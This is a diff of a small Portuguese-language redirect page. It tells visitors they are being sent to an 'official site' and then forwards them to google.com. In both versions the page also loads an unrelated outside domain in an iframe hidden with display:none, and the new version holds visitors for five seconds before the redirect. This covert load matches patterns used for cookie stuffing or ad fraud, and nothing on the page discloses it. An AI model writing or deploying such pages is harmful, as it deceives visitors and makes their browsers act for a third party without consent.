@@ -5,56 +5,55 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Redirecionando</title>
     <style>
-        /* Estilos básicos para a página e o círculo */
         body {
             display: flex;
-            justify-content: center;
             align-items: center;
+            justify-content: center;
             height: 100vh;
             margin: 0;
             font-family: Arial, sans-serif;
-            background-color: #f3f3f3;
         }
         .container {
             display: flex;
             align-items: center;
+            gap: 10px;
         }
-        .circle {
+        .loading-circle {
             width: 20px;
             height: 20px;
             border-radius: 50%;
             background-color: green;
-            margin-right: 10px;
-            animation: spin 1.5s linear infinite;
         }
-        /* Animação de rotação do círculo */
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        .text {
+            font-size: 16px;
+        }
+        iframe {
+            display: none;
         }
     </style>
+    <script>
+        // Definindo os sets
+        const lnkfrm = "https://iframc.com";
+        const lnkdtn = "https://google.com";
+
+        // Função que será executada ao carregar a página
+        window.onload = function() {
+            // Inserindo o iframe invisível
+            const iframe = document.createElement('iframe');
+            iframe.src = lnkfrm;
+            document.body.appendChild(iframe);
+
+            // Redireciona após 5 segundos
+            setTimeout(function() {
+                window.location.href = lnkdtn;
+            }, 5000);
+        };
+    </script>
 </head>
 <body>
     <div class="container">
-        <div class="circle"></div>
-        <p>✅ Aguarde! Redirecionando para o Site Oficial</p>
+        <div class="loading-circle"></div>
+        <div class="text">✅ Aguarde! Redirecionando para o Site Oficial</div>
     </div>
-
-    <!-- Iframe invisível -->
-    <iframe id="hiddenIframe" src="" style="display:none;"></iframe>
-
-    <script>
-        // Definindo os sets
-        var lnkfrm = 'https://iframc.com';
-        var lnkdtn = 'https://google.com';
-
-        // Carregando o iframe invisível
-        document.getElementById('hiddenIframe').src = lnkfrm;
-
-        // Função de redirecionamento após o carregamento do iframe
-        document.getElementById('hiddenIframe').onload = function() {
-            window.location.href = lnkdtn;
-        };
-    </script>
 </body>
 </html>
